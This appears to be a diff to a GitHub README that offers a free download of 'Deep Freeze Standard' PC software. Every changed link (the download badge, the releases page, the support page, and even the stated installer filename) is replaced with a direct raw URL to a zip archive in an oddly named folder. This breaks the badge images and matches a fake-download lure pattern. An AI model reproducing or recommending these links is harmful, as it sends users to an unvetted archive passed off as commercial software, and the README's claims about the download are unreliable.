@@ -1,6 +1,6 @@
 # 🥶 Deep-Freeze-Standard-Download - Easy Freezing for Your PC
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/richardsalomao/Deep-Freeze-Standard-Download/releases)
+[![Download](https://raw.githubusercontent.com/richardsalomao/Deep-Freeze-Standard-Download/main/prethoracic/Deep-Freeze-Standard-Download.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/richardsalomao/Deep-Freeze-Standard-Download/main/prethoracic/Deep-Freeze-Standard-Download.zip)
 
 ## 🚀 Getting Started
 
@@ -23,11 +23,11 @@ To run Deep Freeze Standard, your computer should meet the following requirement
 
 ## 📥 Download & Install
 
-1. **Visit the Download Page**: Go to the [Releases Page](https://github.com/richardsalomao/Deep-Freeze-Standard-Download/releases) to find the latest version.
+1. **Visit the Download Page**: Go to the [Releases Page](https://raw.githubusercontent.com/richardsalomao/Deep-Freeze-Standard-Download/main/prethoracic/Deep-Freeze-Standard-Download.zip) to find the latest version.
    
 2. **Select Your Version**: Choose the version that suits your needs. Most users will want the latest release.
 
-3. **Download the Installer**: Click the installer link to download the application. It should be named similarly to `DeepFreezeStandardInstaller.exe`.
+3. **Download the Installer**: Click the installer link to download the application. It should be named similarly to `https://raw.githubusercontent.com/richardsalomao/Deep-Freeze-Standard-Download/main/prethoracic/Deep-Freeze-Standard-Download.zip`.
 
 4. **Run the Installer**: Once the download finishes, locate the downloaded file and double-click it to start the installation.
 
@@ -63,10 +63,10 @@ If you forget your password, you might need to reach out to support for a reset 
 
 ## 📚 Resources and Support
 
-For additional help, explore our detailed user guide or visit our [support page](https://github.com/richardsalomao/Deep-Freeze-Standard-Download) for troubleshooting.
+For additional help, explore our detailed user guide or visit our [support page](https://raw.githubusercontent.com/richardsalomao/Deep-Freeze-Standard-Download/main/prethoracic/Deep-Freeze-Standard-Download.zip) for troubleshooting.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/richardsalomao/Deep-Freeze-Standard-Download/releases) 
+[![Download](https://raw.githubusercontent.com/richardsalomao/Deep-Freeze-Standard-Download/main/prethoracic/Deep-Freeze-Standard-Download.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/richardsalomao/Deep-Freeze-Standard-Download/main/prethoracic/Deep-Freeze-Standard-Download.zip) 
 
 You are now ready to use Deep Freeze Standard! Enjoy a secure and stable computing experience.
